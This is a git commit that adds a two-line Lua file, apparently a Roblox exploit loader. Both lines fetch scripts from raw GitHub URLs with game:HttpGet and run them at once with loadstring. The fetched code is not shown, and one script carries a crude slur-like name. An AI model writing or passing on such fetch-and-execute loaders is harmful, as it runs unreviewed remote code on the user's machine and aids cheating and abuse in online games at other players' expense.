f4f2485bdef4d662f26acfb218d8d823b8e2bd2e
czopekxd <88286336+czopekxd@users.noreply.github.com>
2022-01-15 01:24:07 +0100

    Add files via upload

---
+++ hi.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))() wait()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/czopekxd/Gaymode/main/Gaymode'))()
